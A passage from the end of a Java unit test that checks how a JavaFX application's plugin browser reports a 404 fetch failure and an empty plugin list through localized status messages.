            assertEquals(tr("status.plugins.fetchFailed", tr("plugins.problem.httpStatus", "404")), rig.host.last());
            assertFalse(FxTestSupport.callOnFx(() -> rig.palette().isShown()));

            rig.browse("{\"plugins\":[]}", true);

            assertEquals(tr("status.plugins.empty"), rig.host.last());
            assertFalse(FxTestSupport.callOnFx(() -> rig.palette().isShown()));
            assertEquals(List.of(), rig.errors);
        }
    }
}
